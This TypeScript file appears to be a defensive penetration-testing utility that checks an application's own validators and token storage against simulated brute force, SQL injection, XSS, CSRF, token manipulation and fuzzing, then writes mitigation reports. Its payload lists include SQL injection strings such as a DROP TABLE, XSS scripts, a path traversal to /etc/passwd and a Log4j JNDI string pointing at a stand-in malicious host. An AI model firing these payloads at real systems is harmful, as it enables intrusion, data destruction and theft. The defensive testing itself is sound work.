/**
 * Penetration Testing Utilities
 *
 * Task 20: Add security audit and vulnerability testing
 * - Simulate real-world attack scenarios
 * - Test system resilience under attack
 * - Validate security controls effectiveness
 * - Generate attack simulation reports
 */

import { AuthValidationService } from './auth-validation-service';
import { SecureTokenStorage } from './secure-token-storage';
import { SecurityAuditService } from './security-audit';

/**
 * Attack scenario configuration
 */
export interface AttackScenarioConfig {
  name: string;
  description: string;
  severity: 'low' | 'medium' | 'high' | 'critical';
  duration: number; // milliseconds
  intensity: number; // requests per second
  enabled: boolean;
}

/**
 * Penetration test configuration
 */
export interface PenetrationTestConfig {
  scenarios: AttackScenarioConfig[];
  targetEndpoints: string[];
  testDuration: number;
  concurrentAttacks: number;
  reportFormat: 'json' | 'detailed' | 'executive';
  stopOnCritical: boolean;
}

/**
 * Attack simulation result
 */
export interface AttackSimulationResult {
  scenarioName: string;
  successful: boolean;
  attempts: number;
  successfulAttempts: number;
  blockedAttempts: number;
  averageResponseTime: number;
  vulnerabilitiesExploited: string[];
  evidence: any[];
  mitigation: string[];
}

/**
 * Penetration test result
 */
export interface PenetrationTestResult {
  summary: {
    totalScenarios: number;
    successfulAttacks: number;
    blockedAttacks: number;
    criticalFindings: number;
    highFindings: number;
    averageBlockingRate: number;
    testDuration: number;
  };
  scenarios: AttackSimulationResult[];
  systemResilience: {
    overallScore: number; // 0-100
    authenticationSecurity: number;
    inputValidationStrength: number;
    sessionManagementSecurity: number;
    rateLimitingEffectiveness: number;
  };
  recommendations: string[];
  timestamp: number;
}

/**
 * Default attack scenarios
 */
const DEFAULT_ATTACK_SCENARIOS: AttackScenarioConfig[] = [
  {
    name: 'Brute Force Login',
    description: 'Attempt to brute force user credentials using common passwords',
    severity: 'high',
    duration: 10000,
    intensity: 5,
    enabled: true,
  },
  {
    name: 'SQL Injection Barrage',
    description: 'Multiple SQL injection attempts across all input fields',
    severity: 'critical',
    duration: 5000,
    intensity: 3,
    enabled: true,
  },
  {
    name: 'XSS Payload Injection',
    description: 'Attempt to inject various XSS payloads into user inputs',
    severity: 'medium',
    duration: 8000,
    intensity: 4,
    enabled: true,
  },
  {
    name: 'Session Hijacking Simulation',
    description: 'Attempt to hijack and manipulate user sessions',
    severity: 'high',
    duration: 6000,
    intensity: 2,
    enabled: true,
  },
  {
    name: 'CSRF Attack Simulation',
    description: 'Attempt to perform cross-site request forgery attacks',
    severity: 'medium',
    duration: 4000,
    intensity: 3,
    enabled: true,
  },
  {
    name: 'Rate Limit Bypass',
    description: 'Attempt to bypass rate limiting using various techniques',
    severity: 'medium',
    duration: 7000,
    intensity: 10,
    enabled: true,
  },
  {
    name: 'Token Manipulation Attack',
    description: 'Attempt to manipulate and forge authentication tokens',
    severity: 'high',
    duration: 5000,
    intensity: 2,
    enabled: true,
  },
  {
    name: 'Input Fuzzing Attack',
    description: 'Send malformed and oversized inputs to test input handling',
    severity: 'medium',
    duration: 12000,
    intensity: 8,
    enabled: true,
  },
];

/**
 * Penetration Testing Service
 */
export class PenetrationTestingService {
  private config: PenetrationTestConfig;
  private validationService: AuthValidationService;
  private tokenStorage: SecureTokenStorage;
  // private auditService: SecurityAuditService;

  constructor(
    config: Partial<PenetrationTestConfig> = {},
    validationService?: AuthValidationService,
    tokenStorage?: SecureTokenStorage,
    _auditService?: SecurityAuditService
  ) {
    this.config = {
      scenarios: DEFAULT_ATTACK_SCENARIOS,
      targetEndpoints: ['/login', '/register', '/profile', '/reset-password'],
      testDuration: 60000,
      concurrentAttacks: 3,
      reportFormat: 'detailed',
      stopOnCritical: false,
      ...config,
    };

    this.validationService = validationService || new AuthValidationService();
    this.tokenStorage = tokenStorage || new SecureTokenStorage();
    // this.auditService = _auditService || new SecurityAuditService();
  }

  /**
   * Run comprehensive penetration testing
   */
  async runPenetrationTest(): Promise<PenetrationTestResult> {
    console.log('Starting penetration testing...');
    const startTime = Date.now();
    const results: AttackSimulationResult[] = [];

    const enabledScenarios = this.config.scenarios.filter(s => s.enabled);

    for (const scenario of enabledScenarios) {
      console.log(`Running attack scenario: ${scenario.name}`);

      const result = await this.simulateAttackScenario(scenario);
      results.push(result);

      // Stop if critical vulnerability is exploited and stopOnCritical is enabled
      if (this.config.stopOnCritical && scenario.severity === 'critical' && result.successful) {
        console.log('Critical vulnerability exploited. Stopping test.');
        break;
      }

      // Small delay between scenarios
      await this.delay(1000);
    }

    const duration = Date.now() - startTime;

    return this.generatePenetrationTestReport(results, duration);
  }

  /**
   * Simulate a specific attack scenario
   */
  private async simulateAttackScenario(
    scenario: AttackScenarioConfig
  ): Promise<AttackSimulationResult> {
    const result: AttackSimulationResult = {
      scenarioName: scenario.name,
      successful: false,
      attempts: 0,
      successfulAttempts: 0,
      blockedAttempts: 0,
      averageResponseTime: 0,
      vulnerabilitiesExploited: [],
      evidence: [],
      mitigation: [],
    };

    const startTime = Date.now();
    const endTime = startTime + scenario.duration;
    const interval = 1000 / scenario.intensity; // milliseconds between attempts
    const responseTimes: number[] = [];

    while (Date.now() < endTime) {
      const attemptStart = Date.now();

      try {
        const attackResult = await this.executeAttack(scenario);
        result.attempts++;

        if (attackResult.successful) {
          result.successfulAttempts++;
          result.successful = true;
          result.vulnerabilitiesExploited.push(...attackResult.vulnerabilities);
          result.evidence.push(attackResult.evidence);
        } else {
          result.blockedAttempts++;
        }

        const responseTime = Date.now() - attemptStart;
        responseTimes.push(responseTime);
      } catch {
        // Attack attempt failed/blocked
        result.blockedAttempts++;
        result.attempts++;
      }

      await this.delay(interval);
    }

    result.averageResponseTime =
      responseTimes.length > 0
        ? responseTimes.reduce((a, b) => a + b, 0) / responseTimes.length
        : 0;

    result.mitigation = this.generateMitigationRecommendations(scenario, result);

    return result;
  }

  /**
   * Execute a specific attack based on scenario
   */
  private async executeAttack(scenario: AttackScenarioConfig): Promise<{
    successful: boolean;
    vulnerabilities: string[];
    evidence: any;
  }> {
    switch (scenario.name) {
      case 'Brute Force Login':
        return this.executeBruteForceAttack();

      case 'SQL Injection Barrage':
        return this.executeSQLInjectionAttack();

      case 'XSS Payload Injection':
        return this.executeXSSAttack();

      case 'Session Hijacking Simulation':
        return this.executeSessionHijackingAttack();

      case 'CSRF Attack Simulation':
        return this.executeCSRFAttack();

      case 'Rate Limit Bypass':
        return this.executeRateLimitBypassAttack();

      case 'Token Manipulation Attack':
        return this.executeTokenManipulationAttack();

      case 'Input Fuzzing Attack':
        return this.executeInputFuzzingAttack();

      default:
        return { successful: false, vulnerabilities: [], evidence: null };
    }
  }

  /**
   * Execute brute force login attack
   */
  private async executeBruteForceAttack(): Promise<{
    successful: boolean;
    vulnerabilities: string[];
    evidence: any;
  }> {
    const commonPasswords = ['password', '123456', 'admin', 'qwerty', 'letmein'];
    const testEmail = 'admin@example.com';
    const password = commonPasswords[Math.floor(Math.random() * commonPasswords.length)];

    // Check rate limiting first
    const rateLimitCheck = this.validationService.checkRateLimit('192.168.1.100', testEmail);

    if (!rateLimitCheck.allowed) {
      return {
        successful: false,
        vulnerabilities: [],
        evidence: { blocked: true, reason: 'rate-limited' },
      };
    }

    // Attempt login with weak credentials
    const loginResult = this.validationService.validateLoginData({
      email: testEmail,
      password: password,
    });

    // Record failed attempt
    this.validationService.recordFailedAttempt('192.168.1.100', testEmail);

    // Check if validation passed (which would be a vulnerability)
    if (loginResult.isValid) {
      return {
        successful: true,
        vulnerabilities: ['Weak password accepted', 'Insufficient brute force protection'],
        evidence: { email: testEmail, password, result: loginResult },
      };
    }

    return {
      successful: false,
      vulnerabilities: [],
      evidence: { blocked: true, reason: 'invalid-credentials' },
    };
  }

  /**
   * Execute SQL injection attack
   */
  private async executeSQLInjectionAttack(): Promise<{
    successful: boolean;
    vulnerabilities: string[];
    evidence: any;
  }> {
    const sqlPayloads = [
      "' OR '1'='1",
      "'; DROP TABLE users; --",
      "' UNION SELECT password FROM users--",
      "admin'--",
      "' OR 1=1#",
    ];

    const payload = sqlPayloads[Math.floor(Math.random() * sqlPayloads.length)];

    // Test email field
    const emailResult = this.validationService.validateEmail(payload);

    // Test registration data
    const regResult = this.validationService.validateRegistrationData({
      email: 'test@example.com',
      password: 'Password123!',
      name: payload,
    });

    if (emailResult.isValid || regResult.isValid) {
      return {
        successful: true,
        vulnerabilities: ['SQL injection in input validation'],
        evidence: { payload, emailResult, regResult },
      };
    }

    return { successful: false, vulnerabilities: [], evidence: { payload, blocked: true } };
  }

  /**
   * Execute XSS attack
   */
  private async executeXSSAttack(): Promise<{
    successful: boolean;
    vulnerabilities: string[];
    evidence: any;
  }> {
    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '<img src="x" onerror="alert(1)">',
      'javascript:alert("XSS")',
      '<svg onload="alert(1)">',
      '<iframe src="javascript:alert(1)">',
    ];

    const payload = xssPayloads[Math.floor(Math.random() * xssPayloads.length)];

    const nameResult = this.validationService.validateName(payload);

    // Check if payload was sanitized properly
    if (
      nameResult.isValid ||
      (nameResult.sanitizedData && nameResult.sanitizedData.includes('<'))
    ) {
      return {
        successful: true,
        vulnerabilities: ['XSS vulnerability in name field'],
        evidence: { payload, result: nameResult },
      };
    }

    return { successful: false, vulnerabilities: [], evidence: { payload, blocked: true } };
  }

  /**
   * Execute session hijacking attack simulation
   */
  private async executeSessionHijackingAttack(): Promise<{
    successful: boolean;
    vulnerabilities: string[];
    evidence: any;
  }> {
    // Simulate session token manipulation
    await this.tokenStorage.storeToken('victim-session', 'legitimate-session-token');

    // Attempt to access session with manipulated token
    const manipulatedToken = 'hacker-forged-token';
    await this.tokenStorage.storeToken('victim-session', manipulatedToken);

    const retrievedToken = await this.tokenStorage.getToken('victim-session');

    // Check if token was overwritten (potential vulnerability)
    if (retrievedToken === manipulatedToken) {
      return {
        successful: true,
        vulnerabilities: ['Session token can be overwritten'],
        evidence: { originalToken: 'legitimate-session-token', manipulatedToken, retrievedToken },
      };
    }

    return { successful: false, vulnerabilities: [], evidence: { protected: true } };
  }

  /**
   * Execute CSRF attack simulation
   */
  private async executeCSRFAttack(): Promise<{
    successful: boolean;
    vulnerabilities: string[];
    evidence: any;
  }> {
    // Generate legitimate CSRF token
    const validToken = this.validationService.generateCSRFToken();

    // Attempt with forged/missing token
    const forgedToken = 'forged-csrf-token';
    const isForgedValid = this.validationService.validateCSRFToken(forgedToken);
    const isEmptyValid = this.validationService.validateCSRFToken('');

    if (isForgedValid || isEmptyValid) {
      return {
        successful: true,
        vulnerabilities: ['CSRF protection can be bypassed'],
        evidence: { validToken, forgedToken, isForgedValid, isEmptyValid },
      };
    }

    return { successful: false, vulnerabilities: [], evidence: { protected: true } };
  }

  /**
   * Execute rate limit bypass attack
   */
  private async executeRateLimitBypassAttack(): Promise<{
    successful: boolean;
    vulnerabilities: string[];
    evidence: any;
  }> {
    const testIP = '192.168.1.200';
    const testEmail = 'victim@example.com';

    // Attempt multiple requests rapidly
    const attempts = [];
    for (let i = 0; i < 20; i++) {
      this.validationService.recordFailedAttempt(testIP, testEmail);
      const check = this.validationService.checkRateLimit(testIP, testEmail);
      attempts.push({ attempt: i + 1, allowed: check.allowed, blocked: check.blocked });
    }

    // Check if rate limiting was bypassed
    const finalCheck = this.validationService.checkRateLimit(testIP, testEmail);

    if (finalCheck.allowed && !finalCheck.blocked) {
      return {
        successful: true,
        vulnerabilities: ['Rate limiting can be bypassed with multiple attempts'],
        evidence: { attempts, finalCheck },
      };
    }

    return { successful: false, vulnerabilities: [], evidence: { blocked: true, attempts } };
  }

  /**
   * Execute token manipulation attack
   */
  private async executeTokenManipulationAttack(): Promise<{
    successful: boolean;
    vulnerabilities: string[];
    evidence: any;
  }> {
    // Store legitimate token
    await this.tokenStorage.storeToken('auth-token', 'legitimate-token-value');

    // Attempt to manipulate stored tokens
    const allKeys = this.tokenStorage.getStoredTokenKeys();
    const manipulationAttempts = [];

    for (const key of allKeys) {
      try {
        // Attempt to overwrite with malicious token
        await this.tokenStorage.storeToken(key, 'malicious-token-value');
        const retrievedToken = await this.tokenStorage.getToken(key);

        manipulationAttempts.push({
          key,
          successful: retrievedToken === 'malicious-token-value',
          retrievedToken,
        });
      } catch (error: any) {
        manipulationAttempts.push({ key, successful: false, error: error.message });
      }
    }

    const successfulManipulations = manipulationAttempts.filter(a => a.successful);

    if (successfulManipulations.length > 0) {
      return {
        successful: true,
        vulnerabilities: ['Token storage allows unauthorized manipulation'],
        evidence: { manipulationAttempts, successfulManipulations },
      };
    }

    return {
      successful: false,
      vulnerabilities: [],
      evidence: { protected: true, manipulationAttempts },
    };
  }

  /**
   * Execute input fuzzing attack
   */
  private async executeInputFuzzingAttack(): Promise<{
    successful: boolean;
    vulnerabilities: string[];
    evidence: any;
  }> {
    const fuzzInputs = [
      'A'.repeat(10000), // Length overflow
      '\x00\x01\x02\x03', // Null bytes and control characters
      '../../etc/passwd', // Path traversal
      '%00%01%02%03', // URL encoded null bytes
      '${jndi:ldap://malicious.com/a}', // Log4j injection
      new Array(1000).fill('A').join(''), // Memory exhaustion attempt
    ];

    const vulnerabilities = [];
    const evidence = [];

    for (const input of fuzzInputs) {
      try {
        const emailResult = this.validationService.validateEmail(input);
        const nameResult = this.validationService.validateName(input);

        if (emailResult.isValid) {
          vulnerabilities.push(`Email field accepts malformed input: ${input.substring(0, 50)}...`);
          evidence.push({ field: 'email', input: input.substring(0, 100), result: emailResult });
        }

        if (nameResult.isValid) {
          vulnerabilities.push(`Name field accepts malformed input: ${input.substring(0, 50)}...`);
          evidence.push({ field: 'name', input: input.substring(0, 100), result: nameResult });
        }
      } catch {
        // Expected behavior - input rejected
      }
    }

    if (vulnerabilities.length > 0) {
      return { successful: true, vulnerabilities, evidence };
    }

    return { successful: false, vulnerabilities: [], evidence: { protected: true } };
  }

  /**
   * Generate mitigation recommendations for a scenario
   */
  private generateMitigationRecommendations(
    scenario: AttackScenarioConfig,
    result: AttackSimulationResult
  ): string[] {
    const recommendations: string[] = [];

    if (result.successful) {
      switch (scenario.name) {
        case 'Brute Force Login':
          recommendations.push('Implement stronger rate limiting');
          recommendations.push('Add CAPTCHA after failed attempts');
          recommendations.push('Implement account lockout policies');
          recommendations.push('Use multi-factor authentication');
          break;

        case 'SQL Injection Barrage':
          recommendations.push('Use parameterized queries exclusively');
          recommendations.push('Implement input sanitization');
          recommendations.push('Add database query monitoring');
          recommendations.push('Use least privilege database access');
          break;

        case 'XSS Payload Injection':
          recommendations.push('Implement output encoding');
          recommendations.push('Use Content Security Policy headers');
          recommendations.push('Sanitize all user inputs');
          recommendations.push('Validate input on both client and server');
          break;

        case 'Session Hijacking Simulation':
          recommendations.push('Implement secure session management');
          recommendations.push('Use secure, HttpOnly cookies');
          recommendations.push('Implement session timeout');
          recommendations.push('Regenerate session IDs on login');
          break;

        case 'CSRF Attack Simulation':
          recommendations.push('Implement proper CSRF tokens');
          recommendations.push('Validate origin headers');
          recommendations.push('Use SameSite cookie attributes');
          recommendations.push('Implement double-submit cookies');
          break;

        case 'Rate Limit Bypass':
          recommendations.push('Implement distributed rate limiting');
          recommendations.push('Use multiple rate limiting strategies');
          recommendations.push('Add IP-based blocking');
          recommendations.push('Implement progressive delays');
          break;

        case 'Token Manipulation Attack':
          recommendations.push('Implement token encryption');
          recommendations.push('Add token integrity checks');
          recommendations.push('Use secure token storage');
          recommendations.push('Implement token rotation');
          break;

        case 'Input Fuzzing Attack':
          recommendations.push('Implement comprehensive input validation');
          recommendations.push('Add input length limits');
          recommendations.push('Sanitize all inputs');
          recommendations.push('Use input validation libraries');
          break;
      }
    } else {
      recommendations.push(
        `${scenario.name} was successfully blocked - maintain current protections`
      );
    }

    return recommendations;
  }

  /**
   * Generate comprehensive penetration test report
   */
  private generatePenetrationTestReport(
    results: AttackSimulationResult[],
    duration: number
  ): PenetrationTestResult {
    const totalScenarios = results.length;
    const successfulAttacks = results.filter(r => r.successful).length;
    const blockedAttacks = totalScenarios - successfulAttacks;

    const criticalFindings = results.filter(
      r =>
        r.successful &&
        this.config.scenarios.find(s => s.name === r.scenarioName)?.severity === 'critical'
    ).length;

    const highFindings = results.filter(
      r =>
        r.successful &&
        this.config.scenarios.find(s => s.name === r.scenarioName)?.severity === 'high'
    ).length;

    const totalAttempts = results.reduce((sum, r) => sum + r.attempts, 0);
    const totalBlocked = results.reduce((sum, r) => sum + r.blockedAttempts, 0);
    const averageBlockingRate = totalAttempts > 0 ? (totalBlocked / totalAttempts) * 100 : 0;

    // Calculate system resilience scores
    const authResults = results.filter(r =>
      ['Brute Force Login', 'Session Hijacking Simulation'].includes(r.scenarioName)
    );
    const inputResults = results.filter(r =>
      ['SQL Injection Barrage', 'XSS Payload Injection', 'Input Fuzzing Attack'].includes(
        r.scenarioName
      )
    );
    const sessionResults = results.filter(r =>
      ['Session Hijacking Simulation', 'Token Manipulation Attack'].includes(r.scenarioName)
    );
    const rateLimitResults = results.filter(r =>
      ['Rate Limit Bypass', 'Brute Force Login'].includes(r.scenarioName)
    );

    const authScore = this.calculateResilienceScore(authResults);
    const inputScore = this.calculateResilienceScore(inputResults);
    const sessionScore = this.calculateResilienceScore(sessionResults);
    const rateLimitScore = this.calculateResilienceScore(rateLimitResults);
    const overallScore = (authScore + inputScore + sessionScore + rateLimitScore) / 4;

    // Generate recommendations
    const recommendations = new Set<string>();
    results.forEach(result => {
      result.mitigation.forEach(rec => recommendations.add(rec));
    });

    return {
      summary: {
        totalScenarios,
        successfulAttacks,
        blockedAttacks,
        criticalFindings,
        highFindings,
        averageBlockingRate,
        testDuration: duration,
      },
      scenarios: results,
      systemResilience: {
        overallScore,
        authenticationSecurity: authScore,
        inputValidationStrength: inputScore,
        sessionManagementSecurity: sessionScore,
        rateLimitingEffectiveness: rateLimitScore,
      },
      recommendations: Array.from(recommendations),
      timestamp: Date.now(),
    };
  }

  /**
   * Calculate resilience score for a category of attacks
   */
  private calculateResilienceScore(results: AttackSimulationResult[]): number {
    if (results.length === 0) return 100;

    const successfulAttacks = results.filter(r => r.successful).length;
    const blockingRate = ((results.length - successfulAttacks) / results.length) * 100;

    return Math.round(blockingRate);
  }

  /**
   * Generate detailed penetration test report
   */
  generateDetailedReport(result: PenetrationTestResult): string {
    let report = '';

    report += '# Penetration Test Report\n\n';
    report += `**Generated:** ${new Date(result.timestamp).toISOString()}\n`;
    report += `**Test Duration:** ${result.summary.testDuration}ms\n\n`;

    report += '## Executive Summary\n\n';
    report += `- **Total Attack Scenarios:** ${result.summary.totalScenarios}\n`;
    report += `- **Successful Attacks:** ${result.summary.successfulAttacks}\n`;
    report += `- **Blocked Attacks:** ${result.summary.blockedAttacks}\n`;
    report += `- **Critical Findings:** ${result.summary.criticalFindings}\n`;
    report += `- **High Severity Findings:** ${result.summary.highFindings}\n`;
    report += `- **Average Blocking Rate:** ${result.summary.averageBlockingRate.toFixed(1)}%\n\n`;

    report += '## System Resilience Assessment\n\n';
    report += `- **Overall Security Score:** ${result.systemResilience.overallScore}/100\n`;
    report += `- **Authentication Security:** ${result.systemResilience.authenticationSecurity}/100\n`;
    report += `- **Input Validation Strength:** ${result.systemResilience.inputValidationStrength}/100\n`;
    report += `- **Session Management Security:** ${result.systemResilience.sessionManagementSecurity}/100\n`;
    report += `- **Rate Limiting Effectiveness:** ${result.systemResilience.rateLimitingEffectiveness}/100\n\n`;

    report += '## Attack Scenario Results\n\n';
    result.scenarios.forEach((scenario, index) => {
      report += `### ${index + 1}. ${scenario.scenarioName}\n\n`;
      report += `**Status:** ${scenario.successful ? '❌ SUCCESSFUL ATTACK' : '✅ BLOCKED'}\n`;
      report += `**Total Attempts:** ${scenario.attempts}\n`;
      report += `**Successful Attempts:** ${scenario.successfulAttempts}\n`;
      report += `**Blocked Attempts:** ${scenario.blockedAttempts}\n`;
      report += `**Average Response Time:** ${scenario.averageResponseTime.toFixed(2)}ms\n\n`;

      if (scenario.vulnerabilitiesExploited.length > 0) {
        report += '**Vulnerabilities Exploited:**\n';
        scenario.vulnerabilitiesExploited.forEach(vuln => {
          report += `- ${vuln}\n`;
        });
        report += '\n';
      }

      if (scenario.mitigation.length > 0) {
        report += '**Mitigation Recommendations:**\n';
        scenario.mitigation.forEach(mit => {
          report += `- ${mit}\n`;
        });
        report += '\n';
      }

      report += '---\n\n';
    });

    report += '## Overall Recommendations\n\n';
    result.recommendations.forEach((rec, index) => {
      report += `${index + 1}. ${rec}\n`;
    });

    return report;
  }

  /**
   * Utility method for delays
   */
  private delay(ms: number): Promise<void> {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  /**
   * Cleanup test data
   */
  cleanup(): void {
    this.validationService.clearRateLimitData();
    this.validationService.clearCSRFTokens();
    this.tokenStorage.clearAllTokens();
  }
}
